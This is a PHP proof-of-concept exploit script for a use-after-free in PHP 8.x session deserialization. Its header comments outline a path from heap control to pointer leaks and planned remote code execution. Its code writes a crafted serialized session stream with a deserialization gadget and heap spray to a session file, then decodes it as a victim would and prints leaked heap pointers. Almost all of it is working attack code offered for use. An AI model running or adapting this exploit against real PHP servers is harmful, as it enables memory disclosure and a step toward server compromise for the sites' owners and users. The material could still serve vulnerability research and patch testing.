#!/usr/bin/env php
<?php
/*
 * Session-decode UAF — escalation rungs (php 8.x, stock NTS build, CLI)
 *
 * Rung 1 (write control): the dangling var_hash slot's zval bytes are fully
 *   attacker-controlled: the serialized string element right after the C:
 *   gadget reclaims the freed 320B property-table block; a forged zval at
 *   offset 40 of that string becomes what R:4 copies into $_SESSION.
 * Rung 2a (heap leak): R:n; resolves dangling slots BY REFERENCE — the
 *   resolver writes a real zend_reference heap pointer into the reclaimed
 *   string ("write-through"); any app that reflects a session string back
 *   discloses it. 7 pointers per round, 5/5 rounds on stock php8.3.6.
 *
 * Rung 2b (arbitrary read) needs same-process round-trips (fpm worker
 * reuse): first round leaks the spray cluster address, next round forges
 * IS_STRING at a chosen address. BLOCKED on fpm heap grooming in current
 * testing (the 320B-bin reclaim is stolen during fpm's decode; needs
 * allocation tracing, not knob-turning). Rung 3 (RCE) rides on 2b via a
 * forged IS_OBJECT + fake handlers + request-shutdown destructor call
 * (no script control needed for the trigger).
 *
 * Usage:
 *   php session_uaf_leak.php plant   # write the attack stream to the session file
 *   php session_uaf_leak.php read    # decode it as the victim, print leaks
 */
error_reporting(0);

const SID = 'UafLeak00000000000000000000A';
const DIR = '/tmp/sess_uaf_leak';
const SPRAY_LEN = 280;
const MARKER = 0xBBBB0000;

class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void { $o = unserialize($data); $o->x = 0; }
}

function build_stream(): string {
    $inner = 'O:8:"stdClass":8:{';
    for ($i = 0; $i < 8; $i++) $inner .= 's:1:"' . chr(97 + $i) . '";i:' . (100 + $i) . ';';
    $inner .= '}';
    $spray = str_repeat("\x00", SPRAY_LEN);
    for ($k = 0; $k < 8; $k++) {
        $vo = 8 + $k * 32;
        $m = MARKER + $k;
        $spray[$vo] = chr($m & 0xFF); $spray[$vo+1] = chr(($m >> 8) & 0xFF);
        $spray[$vo+2] = chr(($m >> 16) & 0xFF); $spray[$vo+3] = chr(($m >> 24) & 0xFF);
        $spray[$vo+8] = "\x04"; // full type_info LONG: 04 00 00 00 (rest already NUL)
    }
    $parts = ['i:0;C:10:"CachedData":' . strlen($inner) . ':{' . $inner . '}'];
    for ($i = 0; $i < 32; $i++) $parts[] = 'i:' . ($i + 1) . ';s:' . SPRAY_LEN . ':"' . $spray . '";';
    for ($k = 0; $k < 8; $k++) $parts[] = 'i:' . (33 + $k) . ';R:' . (4 + $k) . ';';
    return 'upload_progress_x|a:41:{' . implode('', $parts) . '}';
}

@mkdir(DIR);
ini_set('session.save_path', DIR);
ini_set('session.serialize_handler', 'php');
ini_set('session.use_strict_mode', '0');
session_id(SID);

$mode = $argv[1] ?? 'read';
if ($mode === 'plant') {
    file_put_contents(DIR . '/sess_' . SID, build_stream());
    echo "planted attack stream (" . strlen(build_stream()) . "B)\n";
    exit(0);
}

// read (victim): decode runs the gadget; R: write-through leaks heap pointers
// into whichever sprayed string reclaimed the freed property table
session_start();
$root = $_SESSION['upload_progress_x'] ?? null;
if (!is_array($root)) { echo "[-] decode shape: " . gettype($root) . "\n"; exit(1); }
$leaks = 0;
foreach ($root as $i => $v) {
    if (!is_string($v) || strlen($v) !== SPRAY_LEN) continue;
    for ($k = 0; $k < 8; $k++) {
        $vo = 8 + $k * 32;
        $chunk = substr($v, $vo, 8);
        $expect = pack('V', MARKER + $k) . "\x00\x00\x00\x00";
        if ($chunk !== $expect) {
            $ptr = unpack('P', $chunk)[1];
            if ($ptr > 0x10000) {
                printf("[+] LEAK spray[%d] zval#%d = 0x%016x\n", $i, $k, $ptr);
                $leaks++;
            }
        }
    }
}
echo $leaks ? "[+] $leaks heap pointers disclosed via session reflection\n"
            : "[-] reclaim missed this round (rerun)\n";
